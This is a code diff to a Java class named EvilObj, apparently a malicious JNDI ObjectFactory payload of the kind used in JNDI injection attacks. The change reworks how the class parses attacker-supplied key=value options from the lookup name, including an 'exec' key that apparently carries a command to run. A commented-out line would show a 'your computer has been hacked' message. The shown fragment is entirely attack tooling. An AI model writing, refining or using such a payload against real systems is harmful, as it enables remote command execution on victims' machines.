@@ -11,19 +11,23 @@ public class EvilObj implements ObjectFactory {
 
     @Override
     public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
-        String info = null;
+        String info = "";
         try {
 //            JOptionPane.showMessageDialog(null, "你的电脑已经被我入侵了！！！");
 //            String k = "xed";
-            String url = name.toString();
+            String base = name.toString();
+            if (base.startsWith("\"") && base.endsWith("\"")){
+                base = base.substring(1, base.length() - 1);
+            }
+            String args = base.substring(base.indexOf("#") + 1);
             String[] cmds;
             String k = "";
-            String[] arr = url.split(";");
+            String[] arr = args.split(";");
             for(String a : arr){
-                String[] kv = a.split(":");
+                String[] kv = a.split("=");
                 String c = kv[1];
                 switch (kv[0]){
-                    case "bash":
+                    case "exec":
                         k = c;
                         break;
                     case "info":
